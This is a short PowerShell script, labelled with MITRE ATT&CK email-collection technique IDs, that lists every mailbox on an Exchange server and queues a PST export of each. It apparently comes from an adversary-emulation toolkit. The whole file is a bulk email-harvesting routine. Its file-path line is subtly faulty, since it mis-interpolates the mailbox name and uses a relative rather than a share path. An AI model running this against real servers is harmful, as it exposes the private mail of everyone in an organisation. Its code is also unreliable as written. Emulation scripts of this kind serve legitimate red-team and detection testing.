<#
    T1114.002 - Email Collection: Remote Email Collection
    T1005 - Data from Local System
    Simple script to export all mailbox on a Exchange server
#>

# Define variables
$MailboxName = "*"

#Get Mailboxes
$Mailboxes = Get-Mailbox -ResultSize Unlimited -Filter {Name -like $MailboxName}

#Export Mailboxes
Foreach ($Mailbox in $Mailboxes){
    New-MailboxExportRequest -Mailbox $Mailbox.Name -FilePath .\Export_$Mailbox.Name.pst
}
